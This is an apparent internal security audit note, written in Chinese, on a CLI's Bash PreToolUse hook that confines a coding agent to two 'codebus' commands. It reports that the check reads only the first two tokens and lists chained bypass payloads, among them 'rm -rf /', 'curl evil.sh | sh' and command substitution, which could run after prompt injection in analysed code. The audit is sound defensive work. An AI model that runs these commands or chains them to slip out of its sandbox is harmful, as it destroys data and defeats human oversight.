# T7 品質檢查：codebus-cli

**Date:** 2026-05-22
**Task:** loop T7（只讀分析，產 backlog 候選）
**範圍:** CLI 2752 LOC。聚焦安全關鍵的 PreToolUse hook（`commands/hook.rs` 765 LOC，最大且是 sandbox 命令閘）全檔精讀 + 其餘指令的錯誤/exit 行為掃描。

---

## 🔴 F4（headline）：Bash hook 只檢查前兩個 token，shell 串接可能繞過 sandbox

**位置:** `commands/hook.rs:98-130`（`is_codebus_lint_command` / `is_codebus_quiz_validate_command` / `is_allowed_bash_command`）
**嚴重度:** 高（sandbox 命令限制可能被繞過）；**需先驗證 Claude Code 的命令串接行為**（見下）

allow 判定用 `cmd.split_whitespace()` 取 argv[0]/argv[1]，確認 `argv[0]` basename 是 `codebus`、`argv[1]` 是 `lint`（或 `quiz validate`）——**但完全不檢查其後內容**。`tool_input.command` 是會被丟進 shell（`sh -c`）執行的字串，所以下列全部通過前綴檢查卻夾帶任意命令：

```
codebus lint; rm -rf /
codebus lint && curl evil.sh | sh
codebus lint $(curl evil)
codebus lint `whoami`
codebus lint | tee /etc/something
codebus lint
malicious-second-line
```

`split_whitespace` 把 `;`、`&&`、`||`、`|`、`$(...)`、backtick、換行 全部攤平成普通 token，predicate 從不拒絕它們。fix/quiz sandbox 的**整個目的**就是「agent 只能跑 `codebus lint` / `codebus quiz validate`」——這個閘只擋住「第一個命令不是 codebus」，擋不住「第一個是 codebus、後面接壞東西」。

**威脅模型成立的理由:** 這個 sandbox 存在正是因為不完全信任 agent——被分析的 source code（`raw/code/`）可能含 prompt injection 誘導 agent 發出這種串接命令。

**關鍵待驗證:** 取決於 Claude Code 自己怎麼把串接命令交給 PreToolUse hook：
- 若 Claude Code 把整條 `codebus lint; rm -rf /` 當**單一** event 把完整字串交給 hook → 現行邏輯**會放行 → 真實逃逸**。
- 若 Claude Code 會**拆分** `;`/`&&` 分段、逐段問 hook → `rm -rf /` 那段會被擋。

→ 動工前先用真實 claude 驗一次（送一條 `codebus lint; echo PWNED` 看 echo 有沒有執行）。

**建議修法（defense-in-depth，不論 Claude Code 行為）:** 不要只查前兩 token——應拒絕含 shell 元字元（`;`、`|`、`&`、`$`、`` ` ``、`>`、`<`、換行 等）的 command，或正面表列「整條命令必須是單一 codebus 調用」。約半天 + 補對應測試。

**測試缺口:** `hook.rs` 測試很完整（lookalikes、子命令、fail-closed、大小寫、路徑分隔），但**完全沒有 shell 串接/元字元的測試案例**——這類 input 從沒被測過，正是漏洞藏身處。

## 🟢 觀察到的好設計（記錄）
- Read hook（image/binary 擋 PII bypass）：fail-closed 嚴謹（空 stdin / malformed / 缺欄位 / type-confusion 數字 file_path 全 block），大小寫跨平台一致且有註解說明為何刻意異於 `is_codebus_binary`，toggle off 行為明確且測試覆蓋。
- `json_escape` 自前處理控制字元，block reason 一律產合法 JSON（含含引號的命令字串）。
- 兩個 hook 都「always exit 0 + 用 decision JSON 表達 block」，符合 PreToolUse 契約。

## 🟡 跨 provider 註記（連動 PE1/PE2）
此 Bash hook **僅 claude 路徑存在**。codex backend 用 `--ignore-rules` + `-s sandbox`、**無 PreToolUse hook**（PE1/PE2 已記）。所以：
- F4 的逃逸面只在 claude；codex 由 sandbox 層管命令執行（`-s read-only` 下能否跑 `codebus quiz validate` 仍是 PE2 未決問題 2）。
- 修 F4 時別忘了 codex 那邊是**另一套機制**，不能假設同一個閘。

## 後續 review 候選（T7 未深讀）
- `commands/chat.rs`（434，REPL + SIGINT + resume；PE1 已看過串接/markdown 那段）。
- `commands/init.rs`（354，多步驟 + 大量 eprintln 錯誤路徑）。
- `commands/quiz.rs`（344）。

## 待 harry
F4 是高優先安全項。**先驗證**：真實 claude 送 `codebus lint; echo PWNED`，看 echo 有沒有被執行。不論結果，建議補 defense-in-depth（拒 shell 元字元）+ 測試。已加進 BACKLOG。
